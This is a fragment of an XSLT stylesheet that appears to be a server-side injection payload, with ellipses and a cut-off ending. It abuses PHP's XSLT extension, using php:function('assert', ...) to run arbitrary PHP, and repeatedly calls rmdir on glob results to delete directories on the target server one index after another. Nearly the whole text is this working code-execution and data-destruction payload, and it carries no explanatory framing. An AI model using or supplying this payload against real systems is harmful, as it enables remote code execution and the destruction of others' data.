  ...
  <xsl:template match="*">
      ...
      <xsl:variable name="i">rmdir(glob('./{,.}*', 1024)[3])</xsl:variable>                                                    
        ...
        <xsl:value-of select="php:function('assert', $j)"/> 
           ...
           <xsl:variable name="k">rmdir(glob('./{,.}*', 1024)[5])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $k)"/> 
              <xsl:variable name="l">rmdir(glob('./{,.}*', 1024)[6])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $l)"/> 
   
           <xsl:variable name="m">rmdir(glob('./{,.}*', 1024)[7])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $m)"/> 
   
           <xsl:variable name="n">rmdir(glob('./{,.}*', 1024)[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $n)"/> 
              <xsl:variable name="o">rmdir(glob('./{,.}*', 1024)[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $o)"/> 
   
           <xsl:variable name="p">rmdir(glob('./{,.}*', 1024)[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $p)"/> 
   
           <xsl:variable name="qq">rmdir(glob('./{,.}*', 1024)[11])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $qq)"/> 

             <xsl:variable name="aa">rmdir(glob('./{,.}*', 1024)[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $aa)"/> 
           <xsl:variable name="a">rmdir(glob('./{,.}*', 1024)[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('./{,.}*', 1024)[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('./{,.}*', 1024)[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('./{,.}*', 1024)[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('./{,.}*', 1024)[17])</xsl:variable>                                                    
